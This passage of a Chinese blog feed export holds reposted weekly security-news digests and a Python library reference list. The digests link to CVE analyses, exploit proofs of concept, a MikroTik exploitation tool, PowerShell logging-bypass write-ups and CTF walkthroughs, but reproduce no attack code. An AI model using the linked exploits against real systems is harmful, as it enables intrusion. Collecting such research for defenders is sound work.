Abuse MobileIron’s RCE to deliver Kaiten</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.blackarrow.net&#x2F;attackers-abuse-mobileirons-rce-to-deliver-kaiten&#x2F;</span><br><span class="line">MobileIron’s mobile DeviceManagement(MDM) 漏洞利用分析</span><br></pre></td></tr></table></figure><p>•403 to RCE in XAMPP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.securifera.com&#x2F;blog&#x2F;2020&#x2F;10&#x2F;13&#x2F;403-to-rce-in-xampp&#x2F;</span><br><span class="line">XAMPP 从403到RCE</span><br></pre></td></tr></table></figure><p>•CVE-2020-16947</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0neb1n&#x2F;CVE-2020-16947</span><br><span class="line">Outlook2019(16.0.13231.20262) 漏洞CVE-2020-16947 poc</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•Getting started with Datalog &amp; Rust for program analysis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hexgolems.com&#x2F;2020&#x2F;10&#x2F;getting-started-with-ddlog&#x2F;</span><br><span class="line">Datalog程序静态分析工具</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•In Process Execute Assembly and Mail Slots</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;teamhydra.blog&#x2F;2020&#x2F;10&#x2F;12&#x2F;in-process-execute-assembly-and-mail-slots&#x2F;</span><br><span class="line">进程加载执行汇编代码</span><br></pre></td></tr></table></figure><p>•XBALTI Phishing Scam</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.medarkus.net&#x2F;2020&#x2F;10&#x2F;11&#x2F;XBALTI-Kit.html</span><br><span class="line">钓鱼方式调研总结</span><br></pre></td></tr></table></figure><p>•HTML to PDF converters, can I hack them?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sidechannel.tempestsi.com&#x2F;html-to-pdf-converters-can-i-hack-them-a681cfee0903</span><br></pre></td></tr></table></figure><p>•The State of Exploit Development: 80% of Exploits Publish Faster than CVEs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;unit42.paloaltonetworks.com&#x2F;state-of-exploit-development&#x2F;</span><br><span class="line">paloalto团队发布的漏洞利用及cve公布之间的分析</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.10.5-10.11一周安全知识动态</title>
      <link href="/2020/10/11/%5B%E8%BD%AC%5D2020.10.5-10.11%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/10/11/%5B%E8%BD%AC%5D2020.10.5-10.11%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-10-5-10-11一周安全知识动态"><a href="#2020-10-5-10-11一周安全知识动态" class="headerlink" title="2020.10.5-10.11一周安全知识动态"></a>2020.10.5-10.11一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•RIFT: F5 CVE-2020-5902 and Citrix CVE-2020-8193, CVE-2020-8195 and CVE-2020-8196 honeypot data release</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2020&#x2F;10&#x2F;09&#x2F;rift-f5-cve-2020-5902-and-citrix-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-honeypot-data-release&#x2F;</span><br><span class="line">对F5 CVE-2020-5902、Citrix CVE-2020-8193、CVE-2020-8195以及CVE-2020-8196等漏洞三个月蜜罐数据的分析</span><br></pre></td></tr></table></figure><p>•A journey into defeating regulated electronic cigarette protections</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.ioactive.com&#x2F;2020&#x2F;10&#x2F;a-journey-into-defeating-regulated.html</span><br><span class="line">攻击电子香烟系统</span><br></pre></td></tr></table></figure><p>•Reverse engineering my cable modem and turning it into an SDR</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;stdw.github.io&#x2F;cm-sdr&#x2F;</span><br><span class="line">逆向cable modem将它做成SDR</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•From LNK to RCE Finding bugs in Windows Shell Link Parser</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hitcon.org&#x2F;2020&#x2F;slides&#x2F;From%20LNK%20to%20RCE%20Finding%20bugs%20in%20Windows%20Shell%20Link%20Parser.pdfwindows </span><br><span class="line">ShellLinkParser漏洞挖掘</span><br></pre></td></tr></table></figure><p>•Fuzzing internships for open source software</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;opensource.googleblog.com&#x2F;2020&#x2F;10&#x2F;fuzzing-internships-for-open-source.html</span><br><span class="line">开源软件fuzz</span><br></pre></td></tr></table></figure><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•SpeedPwning VMware Workstation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.synacktiv.com&#x2F;sites&#x2F;default&#x2F;files&#x2F;2020-10&#x2F;Speedpwning_VMware_Workstation.pdf</span><br></pre></td></tr></table></figure><h3 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h3><p>•Morty’s New Tool : Android Application Based CTF Challenge Walkthrough</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@saurabh_jain_&#x2F;mortys-new-tool-android-application-based-ctf-challenge-walkthrough-6058e080598e</span><br><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@saurabh_jain_&#x2F;planet-x-android-application-based-ctf-challenge-walkthrough-778547aac015</span><br><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@saurabh_jain_&#x2F;morty-sherlocked-android-application-ctf-challenge-walkthrough-ab1ec2161cb4安卓系列CTF题目writeup</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Compiler support for mitigations Updated on 12/Oct/2018 Addressing Spectre Variant 1 (CVE-2017-5753) in Software</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;developer.arm.com&#x2F;support&#x2F;arm-security-updates&#x2F;speculative-processor-vulnerability&#x2F;compiler-support-for-mitigationsarm公布了针对Spectre CPU漏洞的解决方案</span><br></pre></td></tr></table></figure><p>•We Hacked Apple for 3 Months: Here’s What We Found</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;samcurry.net&#x2F;hacking-apple&#x2F;三个月挖掘苹果产品55个漏洞</span><br></pre></td></tr></table></figure><p>•CVE-2020-14386: Privilege Escalation Vulnerability in the Linux kernel</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;unit42.paloaltonetworks.com&#x2F;cve-2020-14386</span><br><span class="line">https :&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2020&#x2F;09&#x2F;03&#x2F;3CVE-2020-14386 linux 内核提权漏洞</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•CVE-2020-17365 – Hotspot Shield VPN New Privilege Escalation Vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cymptom.com&#x2F;cve-2020-17365-hotspot-shield-vpn-new-privilege-escalation-vulnerability&#x2F;2020&#x2F;10&#x2F;HotspotShield VPN 提权漏洞分析</span><br></pre></td></tr></table></figure><p>•A technical description of CVE-2020-15702</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;flattsecurity.hatenablog.com&#x2F;entry&#x2F;2020&#x2F;09&#x2F;30&#x2F;130844CVE-2020-15702 apport pid条件竞争漏洞分析</span><br></pre></td></tr></table></figure><p>•CVE-2019-0230: APACHE STRUTS OGNL REMOTE CODE EXECUTION</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;blog&#x2F;2020&#x2F;10&#x2F;7&#x2F;cve-2019-0230-apache-struts-ognl-remote-code-executionCVE-2019-0230ApacheStruts rce漏洞分析</span><br></pre></td></tr></table></figure><p>•HP Device Manager – CVE-2020-6925, CVE-2020-6926, CVE-2020-6927</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nickbloor.co.uk&#x2F;2020&#x2F;10&#x2F;05&#x2F;hp-device-manager-cve-2020-6925-cve-2020-6926-cve-2020-6927&#x2F;HP DeviceManager CVE-2020-6925, CVE-2020-6926, CVE-2020-6927漏洞分析</span><br></pre></td></tr></table></figure><p>•Kud I Enter Your Server? New Vulnerabilities in Microsoft Azure</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.intezer.com&#x2F;blog&#x2F;cloud-security&#x2F;kud-i-enter-your-server-new-vulnerabilities-in-microsoft-azure&#x2F;MicrosoftAzure硬编码证书本地提权漏洞</span><br></pre></td></tr></table></figure><p>•CVE-2020-25214.pdf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;immunityinc&#x2F;Advisories&#x2F;blob&#x2F;master&#x2F;2020&#x2F;CVE-2020-25214.pdfOverwolfUpdater免认证漏洞分析</span><br></pre></td></tr></table></figure><p>•JAVA DESERIALIZATION VULNERABILITY IN QRADAR REMOTEJAVASCRIPT SERVLET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.securify.nl&#x2F;advisory&#x2F;java-deserialization-vulnerability-in-qradar-remotejavascript-servletCVE-2020-4280: Java反序列化漏洞分析</span><br></pre></td></tr></table></figure><p>•CVE-2020-11518: how I bruteforced my way into your Active Directory</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;honoki.net&#x2F;2020&#x2F;08&#x2F;10&#x2F;cve-2020-11518-how-i-bruteforced-my-way-into-your-active-directory&#x2F;CVE-2020-11518ActiveDirectory漏洞分析</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•POWERSHELL LOGGING: OBFUSCATION AND SOME NEW(ISH) BYPASSES</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.bc-security.org&#x2F;post&#x2F;powershell-logging-obfuscation-and-some-newish-bypasses-part-1</span><br><span class="line">https :&#x2F;&#x2F;www.bc-security.org&#x2F;post&#x2F;powershell-logging-obfuscation-and-some-newish-bypasses-part-2&#x2F;PowerShell日志混淆技巧</span><br></pre></td></tr></table></figure><p>•Reverse Engineering Go Binaries with Ghidra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cujo.com&#x2F;reverse-engineering-go-binaries-with-ghidra&#x2F;通过Ghidra逆向Go程序</span><br></pre></td></tr></table></figure><p>•How To Host Your Own DNS-over-HTTPS And DNS-over-TLS Services</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.technitium.com&#x2F;2020&#x2F;07&#x2F;how-to-host-your-own-dns-over-https-and.html如何运维DNS-over-HTTPS (DoH)及DNS-over-TLS (DoT) 服务</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 库信息集合</title>
      <link href="/2020/10/06/Python-Lib/"/>
      <url>/2020/10/06/Python-Lib/</url>
      
        <content type="html"><![CDATA[<h1 id="Python库信息"><a href="#Python库信息" class="headerlink" title="Python库信息"></a>Python库信息</h1><h2 id="原生库"><a href="#原生库" class="headerlink" title="原生库"></a>原生库</h2><h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><blockquote><p>string：通用字符串操作</p><p>re：正则表达式操作</p><p>difflib：差异计算工具</p><p>textwrap：文本填充</p><p>unicodedata：Unicode字符数据库</p><p>stringprep：互联网字符串准备工具</p><p>readline：GNU按行读取接口</p><p>rlcompleter：GNU按行读取的实现函数</p><p>struct：将字节解析为打包的二进制数据</p><p>codecs：注册表与基类的编解码器</p></blockquote><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote><p>datetime：基于日期与时间工具</p><p>calendar：通用月份函数</p><p>collections：容器数据类型</p><p>collections.abc：容器虚基类</p><p>heapq：堆队列算法</p><p>bisect：数组二分算法</p><p>array：高效数值数组</p><p>weakref：弱引用</p><p>types：内置类型的动态创建与命名</p><p>copy：浅拷贝与深拷贝</p><p>reprlib：交替repr()的实现</p></blockquote><h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><blockquote><p>numbers：数值的虚基类</p><p>math：数学函数</p><p>cmath：复数的数学函数</p><p>decimal：定点数与浮点数计算</p><p>fractions：有理数</p><p>random：生成伪随机数</p></blockquote><h3 id="函数式编程"><a href="#函数式编程" class="headerlink" title="函数式编程"></a>函数式编程</h3><blockquote><p>itertools：为高效循环生成迭代器</p><p>functools：可调用对象上的高阶函数与操作</p><p>operator：针对函数的标准操作</p></blockquote><h3 id="文件与目录"><a href="#文件与目录" class="headerlink" title="文件与目录"></a>文件与目录</h3><blockquote><p>os.path：通用路径名控制</p><p>fileinput：从多输入流中遍历行</p><p>stat：解释stat()的结果</p><p>filecmp：文件与目录的比较函数</p><p>tempfile：生成临时文件与目录</p><p>glob：Unix风格路径名格式的扩展</p><p>fnmatch：Unix风格路径名格式的比对</p><p>linecache：文本行的随机存储</p><p>shutil：高级文件操作</p><p>macpath：MacOS 9路径控制函数</p></blockquote><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><blockquote><p>pickle：Python对象序列化</p><p>copyreg：注册机对pickle的支持函数</p><p>shelve：Python对象持久化</p><p>marshal：内部Python对象序列化</p><p>dbm：Unix“数据库”接口</p><p>sqlite3：针对SQLite数据库的API2.0</p></blockquote><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><blockquote><p>zlib：兼容gzip的压缩</p><p>gzip：对gzip文件的支持</p><p>bz2：对bzip2压缩的支持</p><p>lzma：使用LZMA算法的压缩</p><p>zipfile：操作ZIP存档</p><p>tarfile：读写tar存档文件</p></blockquote><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><blockquote><p>hashlib：安全散列与消息摘要</p><p>hmac：针对消息认证的键散列</p></blockquote><h3 id="操作系统工具"><a href="#操作系统工具" class="headerlink" title="操作系统工具"></a>操作系统工具</h3><blockquote><p>os：多方面的操作系统接口</p><p>io：流核心工具</p><p>time：时间的查询与转化</p><p>argparser：命令行选项、参数和子命令的解析器</p><p>optparser：命令行选项解析器</p><p>getopt：C风格的命令行选项解析器</p><p>logging：Python日志工具</p><p>logging.config：日志配置</p><p>logging.handlers：日志处理器</p><p>getpass：简易密码输入</p><p>curses：字符显示的终端处理</p><p>curses.textpad：curses程序的文本输入域</p><p>curses.ascii：ASCII字符集工具</p><p>curses.panel：curses的控件栈扩展</p><p>platform：访问底层平台认证数据</p><p>errno：标准错误记号</p><p>ctypes：Python外部函数库</p></blockquote><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><blockquote><p>threading：基于线程的并行</p><p>multiprocessing：基于进程的并行</p><p>concurrent：并发包</p><p>concurrent.futures：启动并行任务</p><p>subprocess：子进程管理</p><p>sched：事件调度</p><p>queue：同步队列</p><p>select：等待I / O完成</p><p>dummy_threading：threading模块的替代（当_thread不可用时）</p><p>_thread：底层的线程API（threading基于其上）</p><p>_dummy_thread：_thread模块的替代（当_thread不可用时）</p></blockquote><h3 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h3><blockquote><p>socket：底层网络接口</p><p>ssl：socket对象的TLS / SSL填充器</p><p>asyncore：异步套接字处理器</p><p>asynchat：异步套接字命令 / 响应处理器</p><p>signal：异步事务信号处理器</p><p>mmap：内存映射文件支持</p></blockquote><h3 id="互联网"><a href="#互联网" class="headerlink" title="互联网"></a>互联网</h3><blockquote><p>email：邮件与MIME处理包</p><p>json：JSON编码与解码</p><p>mailcap：mailcap文件处理</p><p>mailbox：多种格式控制邮箱</p><p>mimetypes：文件名与MIME类型映射</p><p>base64：RFC3548：Base16、Base32、Base64编码</p><p>binhex：binhex4文件编码与解码</p><p>binascii：二进制码与ASCII码间的转化</p><p>quopri：MIMEquoted - printable数据的编码与解码</p><p>uu：uuencode文件的编码与解码</p></blockquote><h3 id="互联网协议与支持"><a href="#互联网协议与支持" class="headerlink" title="互联网协议与支持"></a>互联网协议与支持</h3><blockquote><p>webbrowser：简易Web浏览器控制器</p><p>cgi：CGI支持</p><p>cgitb：CGI脚本反向追踪管理器</p><p>wsgiref：WSGI工具与引用实现</p><p>urllib：URL处理模块</p><p>urllib.request：打开URL连接的扩展库</p><p>urllib.response：urllib模块的响应类</p><p>urllib.parse：将URL解析成组件</p><p>urllib.error：urllib.request引发的异常类</p><p>urllib.robotparser：robots.txt的解析器</p><p>http：HTTP模块</p><p>http.client：HTTP协议客户端</p><p>ftplib：FTP协议客户端</p><p>poplib：POP协议客户端</p><p>imaplib：IMAP4协议客户端</p><p>nntplib：NNTP协议客户端</p><p>smtplib：SMTP协议客户端</p><p>smtpd：SMTP服务器</p><p>telnetlib：Telnet客户端</p><p>uuid：RFC4122的UUID对象</p><p>socketserver：网络服务器框架</p><p>http.server：HTTP服务器</p><p>http.cookies：HTTPCookie状态管理器</p><p>http.cookiejar：HTTP客户端的Cookie处理</p><p>xmlrpc：XML - RPC服务器和客户端模块</p><p>xmlrpc.client：XML - RPC客户端访问</p><p>xmlrpc.server：XML - RPC服务器基础</p><p>ipaddress：IPv4 / IPv6控制库</p></blockquote><h3 id="多媒体"><a href="#多媒体" class="headerlink" title="多媒体"></a>多媒体</h3><blockquote><p>audioop：处理原始音频数据</p><p>aifc：读写AIFF和AIFC文件</p><p>sunau：读写Sun AU文件</p><p>wave：读写WAV文件</p><p>chunk：读取IFF大文件</p><p>colorsys：颜色系统间转化</p><p>imghdr：指定图像类型</p><p>sndhdr：指定声音文件类型</p><p>ossaudiodev：访问兼容OSS的音频设备</p></blockquote><h3 id="国际化"><a href="#国际化" class="headerlink" title="国际化"></a>国际化</h3><blockquote><p>gettext：多语言的国际化服务</p><p>locale：国际化服务</p></blockquote><h3 id="编程框架"><a href="#编程框架" class="headerlink" title="编程框架"></a>编程框架</h3><blockquote><p>turtle：Turtle图形库</p><p>cmd：基于行的命令解释器支持</p><p>shlex：简单词典分析</p></blockquote><h3 id="Tk图形用户接口"><a href="#Tk图形用户接口" class="headerlink" title="Tk图形用户接口"></a>Tk图形用户接口</h3><blockquote><p>tkinter：Tcl / Tk接口</p><p>tkinter.ttk：Tk主题控件</p><p>tkinter.tix：Tk扩展控件</p><p>tkinter.scrolledtext：滚轴文本控件</p></blockquote><h3 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h3><blockquote><p>pydoc：文档生成器和在线帮助系统</p><p>doctest：交互式Python示例</p><p>unittest：单元测试框架</p><p>unittest.mock：模拟对象库</p><p>test：Python回归测试包</p><p>test.support：Python测试工具套件</p><p>venv：虚拟环境搭建</p></blockquote><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><blockquote><p>bdb：调试框架</p><p>faulthandler：Python反向追踪库</p><p>pdb：Python调试器</p><p>timeit：小段代码执行时间测算</p><p>trace：Python执行状态追踪</p></blockquote><h3 id="运行时"><a href="#运行时" class="headerlink" title="运行时"></a>运行时</h3><blockquote><p>sys：系统相关的参数与函数</p><p>sysconfig：访问Python配置信息</p><p>builtins：内置对象</p><p>main：顶层脚本环境</p><p>warnings：警告控制</p><p>contextlib：with状态的上下文工具</p><p>abc：虚基类</p><p>atexit：出口处理器</p><p>traceback：打印或读取一条栈的反向追踪</p><p>future：未来状态定义</p><p>gc：垃圾回收接口</p><p>inspect：检查存活的对象</p><p>site：址相关的配置钩子（hook）</p><p>fpectl：浮点数异常控制</p><p>distutils：生成和安装Python模块</p></blockquote><h3 id="解释器"><a href="#解释器" class="headerlink" title="解释器"></a>解释器</h3><blockquote><p>code：基类解释器</p><p>codeop：编译Python代码</p></blockquote><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><blockquote><p>imp：访问import模块的内部</p><p>zipimport：从ZIP归档中导入模块</p><p>pkgutil：包扩展工具</p><p>modulefinder：通过脚本查找模块</p><p>runpy：定位并执行Python模块</p><p>importlib：import的一种实施</p></blockquote><h3 id="Python语言"><a href="#Python语言" class="headerlink" title="Python语言"></a>Python语言</h3><blockquote><p>parser：访问Python解析树</p><p>ast：抽象句法树</p><p>symtable：访问编译器符号表</p><p>symbol：Python解析树中的常量</p><p>token：Python解析树中的常量</p><p>keyword：Python关键字测试</p><p>tokenize：Python源文件分词</p><p>tabnany：模糊缩进检测</p><p>pyclbr：Python类浏览支持</p><p>py_compile：编译Python源文件</p><p>compileall：按字节编译Python库</p><p>dis：Python字节码的反汇编器</p><p>pickletools：序列化开发工具</p></blockquote><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><blockquote><p>formatter：通用格式化输出</p></blockquote><h3 id="Windows相关"><a href="#Windows相关" class="headerlink" title="Windows相关"></a>Windows相关</h3><blockquote><p>msilib：读写Windows的Installer文件</p><p>msvcrt：MS VC + + Runtime的有用程序</p><p>winreg：Windows注册表访问</p><p>winsound：Windows声音播放接口</p></blockquote><h3 id="Unix相关"><a href="#Unix相关" class="headerlink" title="Unix相关"></a>Unix相关</h3><blockquote><p>posix：最常用的POSIX调用</p><p>pwd：密码数据库</p><p>spwd：影子密码数据库</p><p>grp：组数据库</p><p>crypt：Unix密码验证</p><p>termios：POSIX风格的tty控制</p><p>tty：终端控制函数</p><p>pty：伪终端工具</p><p>fcntl：系统调用fcntl()和ioctl()</p><p>pipes：shell管道接口</p><p>resource：资源可用信息</p><p>nis：Sun的NIS的接口</p><p>syslog：Unix 日志服务</p></blockquote><h2 id="拓展库"><a href="#拓展库" class="headerlink" title="拓展库"></a>拓展库</h2><blockquote><p><a href="https://github.com/cool-RR/PySnooper" target="_blank" rel="noopener">PySnooper</a>：便捷版debug信息输出库</p><p><a href="https://pynacl.readthedocs.io/en/latest/" target="_blank" rel="noopener">PyNaCI</a>：密钥-哈希·签名</p><ul><li>Digital signatures</li><li>Secret-key encryption</li><li>Public-key encryption</li><li>Hashing and message authentication</li><li>Password based key derivation and password hashing</li></ul><p><a href="https://pypi.org/project/merklelib/" target="_blank" rel="noopener">merklelib</a>：Merkle树是基于散列的数据结构，用于以有效方式验证大量数据 （peer-to-peer networks such as Bitcoin, Ethereum, Git, and Tor）</p><p><a href="https://pypi.org/project/vaex/" target="_blank" rel="noopener">Vaex</a>：a high performance Python library for lazy <strong>Out-of-Core DataFrames</strong> (similar to Pandas), to visualize and explore <strong>big</strong> tabular datasets.(大数据集)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.9.28-10.04一周安全知识动态</title>
      <link href="/2020/10/05/%5B%E8%BD%AC%5D2020.9.28-10.4%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/10/05/%5B%E8%BD%AC%5D2020.9.28-10.4%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-9-28-10-04一周安全知识动态"><a href="#2020-9-28-10-04一周安全知识动态" class="headerlink" title="2020.9.28-10.04一周安全知识动态"></a>2020.9.28-10.04一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•This is my first bug hunting in this life</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ufo.stealien.com&#x2F;r&amp;d&#x2F;2020&#x2F;09&#x2F;25&#x2F;bug_hunting.html研究员ohjin关于chrome漏洞挖掘日记</span><br></pre></td></tr></table></figure><p>•ductf2020 pwn-or-web v8 challenge</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;seb-sec.github.io&#x2F;2020&#x2F;09&#x2F;28&#x2F;ductf2020-pwn-or-web.htmlductf2020 v8 writeup</span><br></pre></td></tr></table></figure><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•mikrot8over</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulnersCom&#x2F;mikrot8overFast exploitation tool forMikrotikRouterOS up to 6.38.4</span><br></pre></td></tr></table></figure><p>•IoT-Pentest-devices-and-purpose</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;IoTSecurity101&#x2F;IoT-Pentest-devices-and-purposeIoT设备渗透研究工具收集仓库</span><br></pre></td></tr></table></figure><p>•List-of-Tools</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;IoT-PTv&#x2F;List-of-ToolsIoT安全研究工具</span><br></pre></td></tr></table></figure><p>•Cisco Issues Patches For 2 High-Severity IOS XR Flaws Under Active Attacks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;thehackernews.com&#x2F;2020&#x2F;09&#x2F;cisco.htmlCisco修复了IOS XR两个高危漏洞CVE-2020-3566以及CVE-2020-3569</span><br></pre></td></tr></table></figure><p>•Hardware-Hacking-Experiments</p><figure 